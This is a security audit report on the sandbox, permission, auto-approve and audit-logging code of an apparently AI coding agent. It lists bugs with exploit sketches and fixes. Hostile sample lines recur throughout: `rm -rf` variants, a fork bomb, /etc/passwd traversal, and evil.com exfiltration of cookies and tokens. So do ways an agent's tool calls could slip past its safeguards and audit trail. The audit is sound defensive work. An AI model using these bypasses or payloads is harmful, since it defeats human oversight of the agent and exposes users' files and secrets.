# Safety & Permission System Audit Report

**Scope:** `src/safety/` + `src/agent/verification.rs`  
**Date:** 2026-04-28  
**Focus:** Bypass bugs, race conditions, YOLO mode risks, audit gaps, sandbox escapes, path traversal, and missing checks.

---

## 1. Safety Bypass Bugs

### 1.1 Whitespace-trim tool name bypasses content secret scanning
**File:** `src/safety/checker/validation.rs`  
**Lines:** 37-56  
**Bug:** The dispatcher trims `raw_name` into `tool_name` and matches arms on `tool_name`, but the secret-scan guard on lines 55-56 uses the **untrimmed** `call.function.name`:

```rust
// line 47
match tool_name {
    "file_write" | "file_edit" | ... => {
        // ...
        if call.function.name == "file_write" || call.function.name == "file_edit" {  // BUG
            // scan for secrets
        }
    }
}
```

**Exploit:** A tool call with `"  file_write  "` hits the `file_write` arm (because `tool_name` is trimmed), but the inner `if` is `false` because `call.function.name` still contains whitespace.  
**Impact:** Secrets (AWS keys, tokens) can be written to disk without triggering the scanner.

**Fix:** Use `tool_name` in the inner guard.

---

### 1.2 Sandbox disable token is a public constant
**File:** `src/safety/sandbox.rs`  
**Lines:** 821, 914-943  
**Bug:** `SANDBOX_DISABLE_TOKEN` is a hard-coded, publicly visible string (`"CONFIRM_SANDBOX_DISABLE"`). Any code in the same address space (or a compromised dependency) can call `sandbox.set_enabled(false, Some(SANDBOX_DISABLE_TOKEN))` and disable all safety checks.

**Fix:** Generate a random token at startup and store it in a secure manner; never hard-code bypass tokens.

---

### 1.3 YOLO mode `file_delete` is not treated as destructive
**File:** `src/safety/yolo.rs`  
**Lines:** 292-327  
**Bug:** `should_auto_approve` only inspects `shell_exec` for destructive commands. `file_delete`, `container_remove`, `compose_down`, etc. are not checked against `is_destructive_command`.

**Exploit:** With `allow_destructive_shell: false`, an attacker can still auto-approve `file_delete` on arbitrary files (subject only to the weak `extract_path` / `protected_paths` check).

**Fix:** Check metadata risk or call `is_destructive_command` for all high-risk tools, not just `shell_exec`.

---

### 1.4 `PermissionChecker::check_yolo_mode` ignores tool identity for destructive checks
**File:** `src/safety/tool_metadata.rs`  
**Lines:** 322-339  
**Bug:** `check_yolo_mode` only looks at `metadata.destructive`, not at the actual tool arguments. A tool like `file_write` is marked `destructive: false`, so it is auto-approved even when overwriting `/etc/crontab`.

**Fix:** Integrate argument-level path validation into the permission checker, not just metadata.

---

## 2. Permission Race Conditions

### 2.1 Time-of-check to time-of-use on `PermissionGrant` expiry
**File:** `src/safety/permissions.rs`  
**Lines:** 65-75, 140-144  
**Bug:** `matches_tool()` checks `is_expired()` and returns `false` if expired. However, `is_authorized()` iterates grants with `any(|g| g.matches(...))`. There is **no locking** on the `PermissionStore`. If `cleanup_expired()` runs concurrently with `is_authorized()`, the Vec can be re-allocated mid-iteration (undefined behavior in Rust if one thread mutates while another reads without synchronization).

**Fix:** Wrap `PermissionStore.grants` in a `RwLock` or `Mutex`.

---

### 2.2 YOLO `should_auto_approve` decision is not atomic with execution
**File:** `src/safety/yolo.rs`  
**Lines:** 292-327, 330-374  
**Bug:** `should_auto_approve` reads `is_active()` (which checks `enabled`, `operation_count`, and `start_time`), then performs several independent checks. Another thread can call `disable()` or `record_operation()` between the `is_active()` check and the final decision.

**Exploit:** Thread A decides `AutoApprove`; Thread B calls `disable()`; Thread A proceeds with the operation on a supposedly-disabled YOLO manager.

**Fix:** Perform the entire decision under a single lock or use a compare-and-swap on a generation counter.

---

### 2.3 `AutonomyController` remembered decisions are not persisted atomically
**File:** `src/safety/autonomy.rs`  
**Lines:** 694-712  
**Bug:** `respond()` inserts into `remembered_decisions` HashMap and then logs. If the process crashes between insertion and logging, the user’s "DenyAlways" decision is lost on restart.

**Fix:** Log first, then mutate state; or use a single atomic transaction.

---

## 3. YOLO Mode Risks for SWE-bench

### 3.1 `protected_paths` does not follow symlinks inside the workspace
**File:** `src/safety/yolo.rs`  
**Lines:** 140-147  
**Bug:** `is_protected_path` does `expand_home` then `starts_with`. It never canonicalizes or resolves symlinks. A SWE-bench task could create a symlink `repo/.selfware_link -> /etc` and write through it.

**Impact:** On SWE-bench, the working directory is untrusted code. A malicious test harness or patch could plant symlinks that escape the workspace.

**Fix:** Resolve paths through `open_nofollow_and_resolve` (already implemented in `path_validator.rs`) before checking against protected prefixes.

---

### 3.2 `forbidden_operations` list is trivially bypassed
**File:** `src/safety/yolo.rs`  
**Lines:** 48-55, 127-138  
**Bug:** The forbidden list is a handful of exact strings matched with regex word boundaries. Variations like `rm -rf ./`, `rm -rf .`, `rm -rf --no-preserve-root /`, `python -c "import os; os.system('rm -rf /')"` all bypass it.

**Exploit for SWE-bench:** A generated patch could include a `build.rs` or `Makefile` that runs `rm -rf` indirectly. YOLO mode would auto-approve the `shell_exec` because the literal string `rm -rf /` is not present.

**Fix:** Use the existing `SafetyChecker::check_shell_command` infrastructure inside YOLO mode instead of a separate, weaker regex list.

---

### 3.3 No limit on cumulative filesystem damage
**File:** `src/safety/yolo.rs`  
**Lines:** 42-72  
**Bug:** `max_operations` counts all tool calls, not destructive ones. A SWE-bench run could issue 10,000 `file_delete` calls and each is auto-approved as long as the total operation count is under the limit. There is no rate-limit or damage-budget.

**Fix:** Add a `max_destructive_operations` counter that is decremented only for `file_delete`, `shell_exec`, etc.

---

### 3.4 `container_run` volume mounts bypass YOLO protected-path checks
**File:** `src/safety/yolo.rs`  
**Lines:** 303-308  
**Bug:** `extract_path` only looks at keys named `path`, `file`, or `directory`. `container_run` uses `volumes`, which is an array of `"host:container"` strings. YOLO mode never inspects `volumes`.

**Exploit:** `{"command": "ls", "volumes": ["/etc:/host"]}` auto-approves in YOLO mode.

**Fix:** Add a dedicated `container_run` validator in YOLO mode that mirrors `SafetyChecker::check_volume_mount`.

---

## 4. Audit Logging Gaps

### 4.1 Audit writer task silently drops events on panic or back-pressure
**File:** `src/safety/audit.rs`  
**Lines:** 76-79, 105-143  
**Bug:** The background `writer_loop` is spawned with `tokio::spawn`. If it panics (e.g., disk full, serde error), there is no restart logic. The `mpsc::UnboundedSender` will succeed until the channel buffer is full, then `send` silently errors (`let _ = self.tx.send(...)` on line 154).

**Impact:** Safety blocks, user skips, and tool executions can be lost without warning.

**Fix:**
- Use a bounded channel and back-pressure the caller.
- Handle `send` errors and fallback to stderr or a crash log.
- Wrap the writer in a `tokio::task::JoinSet` with restart logic.

---

### 4.2 `AuditLogger` in `sandbox.rs` never flushes to disk
**File:** `src/safety/sandbox.rs`  
**Lines:** 695-798  
**Bug:** `AuditLogger` has a `log_file: Option<PathBuf>` field but **never writes to it**. The `log()` method only pushes to an in-memory `Vec`. On process crash, the entire audit trail vanishes.

**Impact:** Forensic investigation after a security incident is impossible.

**Fix:** Implement async or blocking file append in `log()`.

---

### 4.3 YOLO audit log truncates arguments, destroying evidence
**File:** `src/safety/yolo.rs`  
**Lines:** 575-596  
**Bug:** `summarize_args` truncates string values to 100 chars. For a `shell_exec` command, the full payload is lost. An attacker could hide a malicious suffix after the truncation point.

**Fix:** Always log the **full** arguments to an append-only, tamper-evident log (e.g., JSONL with HMAC or at least SHA-256 per line). Truncation should only happen for UI display, not audit storage.

---

### 4.4 `AutonomyController` audit log is purely in-memory
**File:** `src/safety/autonomy.rs`  
**Lines:** 523, 727-757  
**Bug:** The `audit_log` is a `Vec<AuditEntry>` with no persistence. On restart, all confirmation history, approved/denied decisions, and trust levels are lost.

**Fix:** Persist autonomy audit entries to the same JSONL sink used by `safety::audit::AuditLogger`.

---

### 4.5 Confirmation prompts are not audited
**File:** `src/safety/confirm.rs`  
**Lines:** 1-559  
**Bug:** The entire confirmation module (`prompt_confirmation`, `auto_confirm`, `requires_confirmation`) has **zero** audit integration. There is no record of what the user was asked, what they answered, or when.

**Fix:** Emit an `AuditEvent` on every prompt, approval, rejection, and skip.

---

## 5. Sandbox Escape Vectors

### 5.1 `FilesystemPolicy::is_allowed` follows symlinks during canonicalization
**File:** `src/safety/sandbox.rs`  
**Lines:** 260-313  
**Bug:** `is_allowed` calls `path.canonicalize()` (line 262), which follows symlinks. It then checks against `denied_paths`. However, the caller might have already opened the file via a different path, or the symlink target could change between canonicalization and the actual open.

**Exploit:**
1. Create symlink `allowed_dir/link -> /etc/passwd`.
2. Call `is_allowed("allowed_dir/link", Read)` → canonicalizes to `/etc/passwd`, which is in `denied_paths` → blocked.
3. But if the attacker wins a race and swaps the symlink between canonicalization and the actual `std::fs::read`, they read `/etc/shadow` instead.

**Fix:** Use `open_nofollow_and_resolve` (already in `path_validator.rs`) and operate on file descriptors, not paths.

---

### 5.2 Sandbox disabled state is a plain `bool`
**File:** `src/safety/sandbox.rs`  
**Lines:** 837, 967-977  
**Bug:** `SecuritySandbox.enabled` is a plain `bool`. There is no defense against memory corruption or debugger-assisted toggling.

**Fix:** (Defense in depth) Check `enabled` at multiple layers and consider using an `AtomicBool` with memory ordering at least `SeqCst`.

---

### 5.3 `ResourceLimits` are declared but never enforced
**File:** `src/safety/sandbox.rs`  
**Lines:** 525-601  
**Bug:** `ResourceLimits` has `max_cpu_time`, `max_memory`, `max_fds`, `max_processes`, and `timeout` fields, but **no enforcement code** exists. The `SecuritySandbox` never calls `setrlimit`, `cgroups`, or `timeout` wrappers.

**Impact:** A fork bomb (`:(){ :|:& };:`) or memory exhaustion attack inside a container or shell exec will succeed despite the sandbox.

**Fix:** Integrate `rlimit` / `prlimit` calls on Unix before spawning child processes.

---

## 6. Path Traversal Bugs

### 6.1 `path_validator.rs` falls back to `lexical_normalize_path` on canonicalization failure
**File:** `src/safety/path_validator.rs`  
**Lines:** 150-182  
**Bug:** When `open_nofollow_and_resolve` fails with an error other than `ELOOP` or `NotFound`, the code falls back to `resolved.canonicalize().unwrap_or_else(|_| lexical_normalize_path(&resolved))`.

`lexical_normalize_path` (lines 472-488) only resolves `.` and `..` textually; it does **not** verify the path exists or resolve symlinks. An attacker can craft a path where `open_nofollow_and_resolve` fails (e.g., permission denied on an intermediate directory), causing the validator to use the lexical fallback, which might incorrectly conclude the path is inside the workspace.

**Exploit:**
```
working_dir = /home/user/project
path = /home/user/project/../../etc/passwd
```
If `open_nofollow_and_resolve` fails on `/home/user/project` (unlikely) or an intermediate component, lexical normalization produces `/etc/passwd` and the check passes.

**Fix:** On any `canonicalize` failure, reject the path rather than falling back to lexical normalization.

---

### 6.2 `is_path_in_allowed_list` double-canonicalizes patterns, causing misses
**File:** `src/safety/path_validator.rs`  
**Lines:** 320-393  
**Bug:** For patterns without glob metacharacters, the code calls `normalize_path(Path::new(pattern))` (line 347), which invokes `canonicalize()`. If the pattern points to a directory that does not yet exist (e.g., a build output dir), `canonicalize()` fails and returns the original path. The subsequent `glob::Pattern::new` then uses the un-canonicalized form, which may not match the canonicalized input path.

**Impact:** Allowed paths for non-existent directories are silently ignored, causing false denials. Conversely, overly broad patterns may allow unexpected paths.

**Fix:** Do not `canonicalize` glob patterns; normalize them textually (resolve `.`, `..`, and expand `~`) and match against the canonicalized input.

---

### 6.3 Suspicious-Unicode check has length loophole
**File:** `src/safety/path_validator.rs`  
**Lines:** 125-138  
**Bug:** The mixed-ASCII/non-ASCII check only fires when `component.len() <= 10`. A component like `src\u{FF0E}\u{FF0E}\u{FF0F}etc\u{FF0F}passwd` can be longer than 10 chars and bypass the check.

**Fix:** Remove the length cap or make it much larger (e.g., 256).

---

### 6.4 `check_symlink_safety` only checks final target, not intermediate hops
**File:** `src/safety/path_validator.rs`  
**Lines:** 396-450  
**Bug:** The loop reads each symlink target and checks if the *final* resolved target is dangerous. However, it does not check intermediate symlinks. If `link1 -> link2 -> /etc/passwd`, the dangerous-target check only runs when `current` is `/etc/passwd`, not when it is `link2`.

**Impact:** A symlink chain that passes through an allowed intermediate could be used to obscure the true target.

**Fix:** Check `resolved_target` against dangerous targets on **every** hop, not just the final one.

---

### 6.5 `strip_unc_prefix` ignores `\\?\UNC\` prefix
**File:** `src/safety/path_validator.rs`  
**Lines:** 458-464  
**Bug:** On Windows, `canonicalize()` can return `\\?\UNC\server\share\...`. `strip_unc_prefix` only strips `\\?\`, leaving `UNC\server\share\...`, which will not match typical allowed paths.

**Fix:** Also strip the `UNC\` prefix and convert to standard `\\server\share\...` format.

---

## 7. Missing Safety Checks That Should Exist

### 7.1 No validation of `git_commit` hooks
**File:** `src/safety/checker/validation.rs`  
**Lines:** 75-77  
**Gap:** `git_commit` is declared "generally safe", but a malicious repository can contain `.git/hooks/pre-commit` or `.git/hooks/commit-msg` scripts. Committing via `git_commit` will execute arbitrary code in those hooks.

**Fix:** Before allowing `git_commit`, verify that `core.hooksPath` is not set to an external directory and that no executable hooks exist in `.git/hooks/`.

---

### 7.2 Package manager tools do not validate package specifiers
**File:** `src/safety/checker/validation.rs`  
**Lines:** 154-159  
**Gap:** `npm_install`, `pip_install`, `yarn_install` only check the optional `script` field. The actual `package` / `requirements` field is not validated. An attacker can request:
- `npm install file:///etc/passwd`
- `pip install git+ssh://evil.com/repo.git`
- `yarn add https://evil.com/malicious.tgz`

**Fix:** Parse and validate the package specifier; block `file://`, `git+ssh://`, and absolute-path references outside the workspace.

---

### 7.3 `http_request` does not validate headers or body
**File:** `src/safety/checker/validation.rs`  
**Lines:** 114-119  
**Gap:** The URL is checked for SSRF, but `headers` and `body` are not inspected. A tool call could exfiltrate local files by base64-encoding them into the body or by setting a `Cookie` header containing secrets.

**Fix:** Scan `headers` and `body` with the same secret scanner used for file content; block `Authorization` headers that contain live credentials.

---

### 7.4 No check for `.env` file writes via `file_edit`
**File:** `src/safety/checker/validation.rs`  
**Lines:** 48-65  
**Gap:** `file_write` and `file_edit` are path-validated, but there is no check that the *content* being written to `.env` files does not overwrite critical secrets or inject malicious environment variables.

**Fix:** Treat `.env` files as high-risk; require confirmation or extra scanning when writing to them.

---

### 7.5 `browser_eval` check is trivially bypassed
**File:** `src/safety/checker/validation.rs`  
**Lines:** 507-516  
**Gap:** The check looks for `fetch(` or `xmlhttprequest` combined with `document.cookie` or `localstorage`. It does not catch:
- `navigator.sendBeacon('https://evil.com', document.cookie)`
- `window.open('https://evil.com?c=' + localStorage.getItem('token'))`
- `eval(atob('ZmV0Y2go...'))`

**Fix:** Run the same `check_shell_command`-style normalization (lowercase, dequote, base64 decode check) on browser eval code.

---

### 7.6 `SecretScanner` skips string literals, not just comments
**File:** `src/safety/scanner.rs`  
**Lines:** 333-373  
**Gap:** The scanner skips lines starting with `//`, `#`, or `/*`, but it does **not** skip string literals. A line like:
```rust
let example = "AKIAIOSFODNN7EXAMPLE"; // documentation example
```
will trigger a false-positive. More importantly, there is no detection of *embedded* shell commands inside strings (e.g., `"; rm -rf /;"` inside a `shell_exec` argument).

**Fix:** Use a lightweight parser to skip string literals when scanning for secrets; add a separate scanner for injected shell metacharacters inside file content.

---

### 7.7 `autonomy.rs` substring matching for protected paths is too broad
**File:** `src/safety/autonomy.rs`  
**Lines:** 384-401  
**Gap:**
```rust
pub fn is_protected(&self, path: &str) -> bool {
    for protected in &self.protected_paths {
        if path.starts_with(protected) || path.contains(protected) {
            return true;
        }
    }
    false
}
```
`path.contains("/etc")` matches `/etcetera/config.yaml`. This causes false positives and erodes user trust, leading them to disable protection.

**Fix:** Use canonicalized path prefix checks (with `/` boundary) instead of substring `contains`.

---

### 7.8 `tool_metadata.rs` default metadata is missing several tools
**File:** `src/safety/tool_metadata.rs`  
**Lines:** 364-456  
**Gap:** Several tools in the `SafetyChecker` dispatch table have no metadata entry:
- `tech_debt_report`
- `analyze`
- `file_fim_edit`
- `code_introspect`, `code_query`, `code_plan`
- `context_evict`
- `page_control`

These fall through to the default `_ => ToolMetadata::custom(false, false, RiskLevel::Medium, false, false)`, which may be inappropriate (e.g., `page_control` can execute JS and take screenshots).

**Fix:** Add explicit metadata for every tool in the dispatch table.

---

### 7.9 No rate-limiting for `shell_exec` or `http_request`
**File:** `src/safety/checker/validation.rs` (entire file)  
**Gap:** There is no per-tool or global rate limit. A malicious agent or compromised model could issue thousands of `http_request` calls in a loop (DoS) or rapid-fire `shell_exec` calls.

**Fix:** Add a token-bucket rate limiter in `SafetyChecker` or `PermissionChecker`.

---

### 7.10 `dry_run.rs` does not actually enforce dry-run semantics
**File:** `src/safety/dry_run.rs`  
**Lines:** 44-213  
**Gap:** `preview_tool_call` and `display_preview` are purely informational. There is **no enforcement** that a tool marked as "would_modify" is actually blocked when dry-run mode is enabled. The caller must manually check `DryRunConfig::enabled`, and many tool dispatch sites do not.

**Fix:** Make `DryRunConfig` a mandatory gate in the tool execution pipeline; reject modifying calls when `enabled == true`.

---

## Summary Table

| # | Category | Severity | File | Line(s) | Description |
|---|----------|----------|------|---------|-------------|
| 1.1 | Bypass | **Critical** | `checker/validation.rs` | 55-56 | Untrimmed `call.function.name` skips secret scan |
| 1.2 | Bypass | **High** | `sandbox.rs` | 821, 914 | Public hard-coded sandbox disable token |
| 1.3 | Bypass | **High** | `yolo.rs` | 292-327 | `file_delete` not treated as destructive in YOLO |
| 1.4 | Bypass | **Medium** | `tool_metadata.rs` | 322-339 | `file_write` metadata not destructive, bypasses YOLO guard |
| 2.1 | Race | **Medium** | `permissions.rs` | 65-144 | `PermissionStore` grants unsynchronized |
| 2.2 | Race | **Medium** | `yolo.rs` | 292-374 | Non-atomic YOLO decision vs. state mutation |
| 2.3 | Race | **Low** | `autonomy.rs` | 694-712 | State mutated before audit persistence |
| 3.1 | YOLO/SWE-bench | **High** | `yolo.rs` | 140-147 | Symlink escape in `is_protected_path` |
| 3.2 | YOLO/SWE-bench | **High** | `yolo.rs` | 48-55 | `forbidden_operations` trivially bypassed |
| 3.3 | YOLO/SWE-bench | **Medium** | `yolo.rs` | 42-72 | No destructive-operation budget |
| 3.4 | YOLO/SWE-bench | **High** | `yolo.rs` | 303-308 | `container_run` volumes ignored |
| 4.1 | Audit gap | **High** | `audit.rs` | 76-154 | Silent event dropping, unbounded channel |
| 4.2 | Audit gap | **Critical** | `sandbox.rs` | 695-798 | `log_file` never written |
| 4.3 | Audit gap | **High** | `yolo.rs` | 575-596 | Argument truncation destroys evidence |
| 4.4 | Audit gap | **Medium** | `autonomy.rs` | 523, 727 | In-memory-only audit log |
| 4.5 | Audit gap | **Medium** | `confirm.rs` | 1-559 | No audit integration at all |
| 5.1 | Sandbox escape | **High** | `sandbox.rs` | 260-313 | Symlink TOCTOU in `is_allowed` |
| 5.2 | Sandbox escape | **Low** | `sandbox.rs` | 837 | Plain `bool` for enabled state |
| 5.3 | Sandbox escape | **High** | `sandbox.rs` | 525-601 | `ResourceLimits` never enforced |
| 6.1 | Path traversal | **High** | `path_validator.rs` | 150-182 | Fallback to lexical normalization on error |
| 6.2 | Path traversal | **Medium** | `path_validator.rs` | 320-393 | Double-canonicalization misses non-existent dirs |
| 6.3 | Path traversal | **Low** | `path_validator.rs` | 125-138 | Unicode mix check limited to ≤10 chars |
| 6.4 | Path traversal | **Medium** | `path_validator.rs` | 396-450 | Intermediate symlink hops unchecked |
| 6.5 | Path traversal | **Low** | `path_validator.rs` | 458-464 | `UNC\` prefix not stripped |
| 7.1 | Missing check | **High** | `checker/validation.rs` | 75-77 | Git hooks not checked before commit |
| 7.2 | Missing check | **High** | `checker/validation.rs` | 154-159 | Package specifiers not validated |
| 7.3 | Missing check | **Medium** | `checker/validation.rs` | 114-119 | HTTP headers/body not scanned |
| 7.4 | Missing check | **Medium** | `checker/validation.rs` | 48-65 | `.env` writes not specially guarded |
| 7.5 | Missing check | **Medium** | `checker/validation.rs` | 507-516 | `browser_eval` bypassable via encoding |
| 7.6 | Missing check | **Low** | `scanner.rs` | 333-373 | String literals not skipped during secret scan |
| 7.7 | Missing check | **Low** | `autonomy.rs` | 384-401 | Substring matching causes false positives |
| 7.8 | Missing check | **Low** | `tool_metadata.rs` | 364-456 | Several tools have no explicit metadata |
| 7.9 | Missing check | **Medium** | `checker/validation.rs` | — | No rate limiting on shell/network tools |
| 7.10 | Missing check | **High** | `dry_run.rs` | 44-213 | Dry-run mode not enforced in execution pipeline |
